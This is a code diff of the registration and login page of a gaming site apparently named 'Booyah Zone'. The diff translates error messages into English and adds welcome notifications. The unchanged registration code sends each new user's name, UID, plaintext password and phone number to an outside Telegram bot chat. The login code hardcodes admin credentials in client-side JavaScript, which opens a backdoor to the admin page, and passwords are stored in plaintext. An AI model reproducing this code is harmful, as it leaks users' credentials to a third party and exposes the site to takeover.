@@ -102,7 +102,7 @@
         <div class="notice-card">
             <h2 id="notice-title" style="font-family:'Orbitron'; color:var(--orange);">MESSAGE</h2>
             <p id="notice-msg" style="margin: 15px 0; font-size: 15px; font-weight: 600; line-height: 1.4;"></p>
-            <button onclick="closeNotice()" style="width:100%; padding:12px; background:var(--orange); border:none; border-radius:10px; color:#fff; font-weight:900; font-family:'Orbitron'; cursor:pointer;">OKAY</button>
+            <button onclick="closeNotice()" style="width:100%; padding:12px; background:var(--orange); border:none; border-radius:10px; color:#fff; font-weight:900; font-family:'Orbitron'; cursor:pointer;">CONFIRM</button>
         </div>
     </div>
 
@@ -189,16 +189,16 @@
             const phone = document.getElementById('r-phone').value.trim();
 
             if(!name || !uid || !pass || !phone) {
-                showNotice("ERROR", "Bhai, saari details fill kar!"); return;
+                showNotice("ERROR", "All details are required!"); return;
             }
 
             try {
-                // Check if phone already registered
                 const checkUser = await database.ref('users/' + phone).once('value');
                 if(checkUser.exists()) {
-                    showNotice("DENIED", "Ye Phone Number pehle se registered hai!"); return;
+                    showNotice("DENIED", "This Phone Number is already registered!"); return;
                 }
 
+                // Register User
                 await database.ref('users/' + phone).set({
                     name: name,
                     uid: uid,
@@ -208,17 +208,24 @@
                     joinedOn: new Date().toLocaleString()
                 });
 
+                // INITIALIZE NOTIFICATION NODE (Critical for fixing your notification issue)
+                await database.ref('user_notifications/' + phone).push({
+                    title: "Welcome to Booyah Zone! 🏆",
+                    message: "Join daily battles and win real cash rewards. Good luck!",
+                    type: "info",
+                    time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
+                });
+
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`<b>🆕 NEW PLAYER</b>\n👤 Name: ${name}\n🆔 UID: ${uid}\n🔑 Pass: ${pass}\n📱 Phone: ${phone}`)}&parse_mode=html`);
                 
-                // SAVE TO BOTH KEYS FOR SAFETY
                 localStorage.setItem('userPhone', phone);
                 localStorage.setItem('gameID', phone); 
                 localStorage.setItem('userName', name);
                 
-                showNotice("WELCOME", "Registration Success!");
+                showNotice("SUCCESS", "Registration Completed Successfully!");
                 setTimeout(() => location.href = 'home.html', 1500);
             } catch(e) {
-                showNotice("ERROR", "Database error!");
+                showNotice("ERROR", "Database connection error!");
             }
         }
 
@@ -227,10 +234,9 @@
             const pass = document.getElementById('l-pass').value.trim();
 
             if(!phone || !pass) {
-                showNotice("ERROR", "Phone aur Password daal!"); return;
+                showNotice("ERROR", "Please enter Phone and Password!"); return;
             }
 
-            // Admin Shortcut
             if(phone === "667788" && pass === "887766") { location.href = 'admin.html'; return; }
 
             try {
@@ -238,14 +244,18 @@
                 if(snap.exists() && snap.val().password === pass) {
                     const userData = snap.val();
                     localStorage.setItem('userPhone', phone);
-                    localStorage.setItem('gameID', phone); // Keeping this for legacy sync
+                    localStorage.setItem('gameID', phone); 
                     localStorage.setItem('userName', userData.name);
+                    
+                    // Trigger a login sync for notifications
+                    database.ref('user_notifications/' + phone).update({ last_login: new Date().toLocaleString() });
+                    
                     location.href = 'home.html';
                 } else {
-                    showNotice("FAILED", "Phone Number ya Password galat hai!");
+                    showNotice("FAILED", "Invalid Phone Number or Password!");
                 }
             } catch(e) {
-                showNotice("ERROR", "Network problem!");
+                showNotice("ERROR", "Network failure. Please try again!");
             }
         }
     </script>
